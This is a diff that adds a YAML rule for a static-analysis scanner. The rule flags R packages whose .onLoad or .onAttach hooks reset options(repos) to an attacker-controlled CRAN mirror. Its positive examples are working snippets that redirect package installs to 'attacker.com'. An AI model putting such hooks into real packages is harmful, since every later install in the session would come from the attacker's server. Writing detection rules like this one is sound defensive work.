@@ -1,0 +1,61 @@
+name: onload_options_repos_rule
+version: "0.2.0"
+type: warning
+attck:
+  - T1195.002
+message: >-
+  options(repos = ...) inside .onLoad or .onAttach replaces the CRAN mirror
+  automatically when a package is loaded. All subsequent install.packages()
+  calls in the session will fetch packages from the attacker-controlled
+  repository.
+description: >-
+  Flag options() calls with a repos argument inside .onLoad or .onAttach.
+  Replacing the repos option poisons the package installation source for
+  the entire R session, redirecting future installs to an attacker-controlled
+  server. Matches assignments using <-, =, or ->.
+xpath: >-
+  (//expr | //expr_or_assign_or_help)[
+    (
+      (LEFT_ASSIGN or EQ_ASSIGN)
+      and expr[1]/SYMBOL[text() = '.onLoad' or text() = '.onAttach']
+      and expr[FUNCTION]/descendant::expr[
+        expr/SYMBOL_FUNCTION_CALL[text() = 'options']
+        and SYMBOL_SUB[text() = 'repos']
+      ]
+    )
+    or
+    (
+      RIGHT_ASSIGN
+      and expr[2]/SYMBOL[text() = '.onLoad' or text() = '.onAttach']
+      and expr[1]//expr[
+        expr/SYMBOL_FUNCTION_CALL[text() = 'options']
+        and SYMBOL_SUB[text() = 'repos']
+      ]
+    )
+  ]
+example_positive:
+  - |
+    .onLoad <- function(libname, pkgname) {
+      options(repos = c(CRAN = "https://attacker.com/cran"))
+    }
+  - |
+    .onAttach <- function(libname, pkgname) {
+      options(repos = c(CRAN = "https://attacker.com/cran"))
+    }
+  - |
+    .onLoad = function(libname, pkgname) {
+      options(repos = c(CRAN = "https://attacker.com/cran"))
+    }
+  - |
+    (function(libname, pkgname) {
+      options(repos = c(CRAN = "https://attacker.com/cran"))
+    }) -> .onLoad
+example_negative:
+  - |
+    .onLoad <- function(libname, pkgname) {
+      options(scipen = 999, warn = 2)
+    }
+  - |
+    configure_session <- function() {
+      options(repos = c(CRAN = "https://cloud.r-project.org"))
+    }
